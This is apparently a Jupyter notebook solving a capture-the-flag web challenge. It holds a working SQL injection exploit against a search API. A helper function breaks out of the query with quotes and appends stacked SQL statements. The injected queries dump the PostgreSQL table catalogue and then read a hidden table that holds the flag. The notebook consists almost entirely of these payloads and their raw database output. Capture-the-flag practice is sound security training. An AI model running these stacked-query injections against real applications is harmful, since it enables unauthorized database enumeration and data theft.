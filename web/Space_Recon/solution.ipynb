{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import urllib.parse"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "HOST  = \"challenges.challenge-ecw.eu\"\n",
    "PORT  = \"39048\"\n",
    "\n",
    "BASE  = f\"http://{HOST}:{PORT}/\"\n",
    "ROUTE = f\"{BASE}/api/search?q=\"\n",
    "\n",
    "def search(q):\n",
    "    q = urllib.parse.quote_plus(q)\n",
    "    print(f\"Requesting: {ROUTE + q}\")\n",
    "    print(requests.get(ROUTE + q).text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requesting: http://challenges.challenge-ecw.eu:39048//api/search?q=%27%27%27\n",
      "{\"code\":1,\"error\":{\"length\":118,\"name\":\"error\",\"severity\":\"ERROR\",\"code\":\"42601\",\"position\":\"98\",\"file\":\"scan.l\",\"line\":\"1123\",\"routine\":\"scanner_yyerror\"}}\n"
     ]
    }
   ],
   "source": [
    "search(\"'''\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "def inject(sql):\n",
    "    search(f\"''';{sql};--\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requesting: http://challenges.challenge-ecw.eu:39048//api/search?q=%27%27%27%3BSELECT+%2A+FROM+pg_catalog.pg_tables%3B--\n",
      "{\"results\":[{\"schemaname\":\"tiger\",\"tablename\":\"cousub\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"public\",\"tablename\":\"spatial_ref_sys\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"topology\",\"tablename\":\"topology\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":true,\"rowsecurity\":false},{\"schemaname\":\"topology\",\"tablename\":\"layer\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":true,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"edges\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_statistic\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_type\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"geocode_settings\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"geocode_settings_default\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_policy\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_authid\",\"tableowner\":\"postgres\",\"tablespace\":\"pg_global\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"direction_lookup\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"secondary_unit_lookup\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"state_lookup\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"street_type_lookup\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"place_lookup\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"county_lookup\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"countysub_lookup\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"zip_lookup_all\",\"tableowner\":\"postgres\",\"hasindexes\":false,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"zip_lookup_base\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"zip_lookup\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"county\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"state\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_user_mapping\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_subscription\",\"tableowner\":\"postgres\",\"tablespace\":\"pg_global\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_attribute\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_proc\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_class\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_attrdef\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_constraint\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_inherits\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_index\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_operator\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_opfamily\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_opclass\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_am\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_amop\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_amproc\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_language\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_largeobject_metadata\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_aggregate\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_statistic_ext\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_rewrite\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_trigger\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_event_trigger\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_description\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_cast\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_enum\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_namespace\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_conversion\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_depend\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_database\",\"tableowner\":\"postgres\",\"tablespace\":\"pg_global\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_db_role_setting\",\"tableowner\":\"postgres\",\"tablespace\":\"pg_global\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_tablespace\",\"tableowner\":\"postgres\",\"tablespace\":\"pg_global\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_pltemplate\",\"tableowner\":\"postgres\",\"tablespace\":\"pg_global\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_auth_members\",\"tableowner\":\"postgres\",\"tablespace\":\"pg_global\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_shdepend\",\"tableowner\":\"postgres\",\"tablespace\":\"pg_global\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_shdescription\",\"tableowner\":\"postgres\",\"tablespace\":\"pg_global\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_ts_config\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_ts_config_map\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_ts_dict\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_ts_parser\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_ts_template\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_extension\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_foreign_data_wrapper\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_foreign_server\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_foreign_table\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_replication_origin\",\"tableowner\":\"postgres\",\"tablespace\":\"pg_global\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_default_acl\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_init_privs\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_seclabel\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_shseclabel\",\"tableowner\":\"postgres\",\"tablespace\":\"pg_global\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_collation\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_partitioned_table\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_range\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_transform\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_sequence\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_publication\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_publication_rel\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_subscription_rel\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"place\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"pg_catalog\",\"tablename\":\"pg_largeobject\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"information_schema\",\"tablename\":\"sql_parts\",\"tableowner\":\"postgres\",\"hasindexes\":false,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"information_schema\",\"tablename\":\"sql_languages\",\"tableowner\":\"postgres\",\"hasindexes\":false,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"information_schema\",\"tablename\":\"sql_features\",\"tableowner\":\"postgres\",\"hasindexes\":false,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"information_schema\",\"tablename\":\"sql_implementation_info\",\"tableowner\":\"postgres\",\"hasindexes\":false,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"information_schema\",\"tablename\":\"sql_packages\",\"tableowner\":\"postgres\",\"hasindexes\":false,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"information_schema\",\"tablename\":\"sql_sizing\",\"tableowner\":\"postgres\",\"hasindexes\":false,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"information_schema\",\"tablename\":\"sql_sizing_profiles\",\"tableowner\":\"postgres\",\"hasindexes\":false,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"zip_state\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"zip_state_loc\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"addrfeat\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"featnames\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"addr\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"zcta5\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"tabblock20\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"faces\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"loader_platform\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"loader_variables\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"loader_lookuptables\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"tract\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"tabblock\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"bg\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"pagc_gaz\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"pagc_lex\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"tiger\",\"tablename\":\"pagc_rules\",\"tableowner\":\"postgres\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"public\",\"tablename\":\"_SCHEMA\",\"tableowner\":\"parse_writer\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"public\",\"tablename\":\"_Hooks\",\"tableowner\":\"parse_writer\",\"hasindexes\":false,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"public\",\"tablename\":\"_GlobalConfig\",\"tableowner\":\"parse_writer\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"public\",\"tablename\":\"_Audience\",\"tableowner\":\"parse_writer\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"public\",\"tablename\":\"_GraphQLConfig\",\"tableowner\":\"parse_writer\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"public\",\"tablename\":\"_PushStatus\",\"tableowner\":\"parse_writer\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"public\",\"tablename\":\"_JobSchedule\",\"tableowner\":\"parse_writer\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"public\",\"tablename\":\"_JobStatus\",\"tableowner\":\"parse_writer\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"public\",\"tablename\":\"countries\",\"tableowner\":\"parse_writer\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"public\",\"tablename\":\"SuperWellHiddenTable\",\"tableowner\":\"parse_writer\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"public\",\"tablename\":\"superwellhiddentable\",\"tableowner\":\"parse_writer\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"public\",\"tablename\":\"_Idempotency\",\"tableowner\":\"parse_writer\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"public\",\"tablename\":\"_User\",\"tableowner\":\"parse_writer\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"public\",\"tablename\":\"_Role\",\"tableowner\":\"parse_writer\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"public\",\"tablename\":\"_Join:users:_Role\",\"tableowner\":\"parse_writer\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"public\",\"tablename\":\"_Join:roles:_Role\",\"tableowner\":\"parse_writer\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false},{\"schemaname\":\"public\",\"tablename\":\"Countries\",\"tableowner\":\"parse_writer\",\"hasindexes\":true,\"hasrules\":false,\"hastriggers\":false,\"rowsecurity\":false}]}\n"
     ]
    }
   ],
   "source": [
    "inject('SELECT * FROM pg_catalog.pg_tables')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requesting: http://challenges.challenge-ecw.eu:39048//api/search?q=%27%27%27%3BSELECT+%2A+FROM+%22superwellhiddentable%22%3B--\n",
      "{\"results\":[{\"objectId\":\"VdWQKl4RHE\",\"createdAt\":\"2024-10-27T11:01:38.282Z\",\"updatedAt\":\"2024-10-27T11:01:38.282Z\",\"username\":\"message\",\"name\":\"Almost but not quite..\"}]}\n"
     ]
    }
   ],
   "source": [
    "inject('SELECT * FROM \"superwellhiddentable\"')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requesting: http://challenges.challenge-ecw.eu:39048//api/search?q=%27%27%27%3BSELECT+%2A+FROM+%22SuperWellHiddenTable%22%3B--\n",
      "{\"results\":[{\"objectId\":\"Nv22wERWYd\",\"createdAt\":\"2024-10-27T11:01:38.222Z\",\"updatedAt\":\"2024-10-27T11:01:38.222Z\",\"username\":\"Flag\",\"name\":\"ECW{Upd@te_YoUr_DEpeNdEnciEs}\"}]}\n"
     ]
    }
   ],
   "source": [
    "inject('SELECT * FROM \"SuperWellHiddenTable\"')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
